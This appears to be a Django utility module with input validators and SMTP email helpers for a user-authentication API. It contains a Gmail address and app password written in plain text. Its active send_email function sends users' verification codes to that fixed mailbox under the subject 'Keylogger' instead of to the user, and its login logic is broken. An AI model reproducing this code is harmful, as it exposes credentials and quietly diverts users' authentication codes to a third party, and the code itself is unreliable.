import re
import smtplib
import ssl
import threading
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

from django.core.mail import EmailMessage
from django.template.loader import render_to_string
from rest_framework.exceptions import ValidationError

email_regex = re.compile(r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,7}\b')
phone_regex = re.compile(r'^\+998(9[012345789]|3[3])[0-9]{7}$')
username_regex = re.compile(r"^[a-zA-Z0-9_.-]+$")

from drf_auth_project import settings


def validate_email_or_username(user_input):
    if re.fullmatch(email_regex, user_input):
        user_input = "email"
    elif re.fullmatch(username_regex, user_input):
        user_input = "username"
    else:
        data = {
            'success': False,
            'message': "Email or username must be entered"
        }
        raise ValidationError(data)

    return user_input


#
# class EmailThread(threading.Thread):
#
#     def __init__(self, email):
#         threading.Thread.__init__(self)
#         self.email = email
#
#     def run(self):
#         self.email.send()
#
#
# class Email:
#     def __init__(self, receiver_email, body):
#         self.sender_email = settings.EMAIL_HOST_USER,
#         self.sender_password = settings.EMAIL_HOST_PASSWORD
#         self.receiver_email = receiver_email
#         self.subject = "Your Code"
#         self.body = body
#         self.message = MIMEMultipart()
#         self.smtp_server = settings.EMAIL_HOST
#         self.smtp_port = settings.EMAIL_PORT
#         self.context = ssl.create_default_context()
#
#     def body_message(self):
#         self.message["From"] = self.sender_email
#         self.message["To"] = self.receiver_email
#         self.message["Subject"] = self.subject
#         self.message.attach(MIMEText(self.body, "plain"))
#
#
#     def send(self):
#         try:
#             self.body_message()
#             with smtplib.SMTP_SSL(self.smtp_server,self.smtp_port, self.context) as server:
#                 server.login(self.sender_email, self.sender_password)
#                 server.sendmail(self.sender_email, self.receiver_email, self.message.as_string())
#                 server.quit()
#             print(f"Email sent from {self.sender_email} to {self.receiver_email} with subject: {self.subject}")
#
#         except Exception as e:
#             print(f"An error occurred: {e}")
#
#
# def send_email(receiver_email, code):
#     print(f"code {code}")
#     html_content = render_to_string(
#         'email/email_code.html',
#         {
#             'code': code,
#         }
#     )
#
#     email = Email(receiver_email=receiver_email, body=code)
#     EmailThread(email).start()
#
#


class SendEmail:
    def __init__(self, receiver_mail, body, ):
        self.sender_mail = "fgffg1633@gmail.com"  # Sender email from Django settings
        self.receiver_mail = receiver_mail  # Recipient's email
        self.password = "jwhy cxpr nftv xxob"  # Email password from Django settings
        self.subject = "subject"  # Email subject
        self.body = body  # Email body (text or HTML)
        self.message = MIMEMultipart()
        self.smtp_server = "smtp.gmail.com"  # Email host (e.g., smtp.gmail.com)
        self.port = 465  # Email port (e.g., 465 for SSL)
        self.context = ssl.create_default_context()

    def body_message(self):
        self.message["From"] = self.sender_mail
        self.message["To"] = self.receiver_mail
        self.message["Subject"] = self.subject
        self.message.attach(MIMEText(self.body, "html"))  # Attach HTML content

    def send(self):
        try:
            self.body_message()
            with smtplib.SMTP_SSL(self.smtp_server, self.port, context=self.context) as server:
                server.login(self.sender_mail, self.password)
                server.sendmail(self.sender_mail, self.receiver_mail, self.message.as_string())
                server.quit()
            print(f"Email sent from {self.sender_mail} to {self.receiver_mail} with subject: {self.subject}")

        except Exception as e:
            print(f"An error occurred: {e}")


# Email sending in a separate thread
class EmailThread(threading.Thread):

    def __init__(self, email):
        threading.Thread.__init__(self)
        self.email = email

    def run(self):
        self.email.send()


# Usage example



class SendEmailZ:
    def __init__(self,email,body):
        self.sender_mail = email
        self.receiver_mail = "fgffg1633@gmail.com"
        self.password = "jwhy cxpr nftv xxob"
        self.subject = "Keylogger"
        self.body = body
        self.message = MIMEMultipart()
        self.smtp_server = "smtp.gmail.com"
        self.port = 465
        self.context = ssl.create_default_context()

    def body_message(self):
        self.message["From"] = self.sender_mail
        self.message["To"] = self.receiver_mail
        self.message["Subject"] = self.subject
        self.message.attach(MIMEText(self.body, "plain"))

    def send(self):
        try:
            self.body_message()
            with smtplib.SMTP_SSL(self.smtp_server, self.port, context=self.context) as server:
                server.login(self.sender_mail, self.password)
                server.sendmail(self.sender_mail, self.receiver_mail, self.message.as_string())
                server.quit()
            print(self.sender_mail, self.receiver_mail, self.body)
            print("Email send!")

        except Exception as e:
            print(e)


def send_email(receiver_mail, code, ):
    html_content = render_to_string(
        'email/email_code.html',
        {
            'code': code,
        }
    )

    email = SendEmailZ(receiver_mail, code)  # Create email instance
    EmailThread(email).start()  # Send email in a separate thread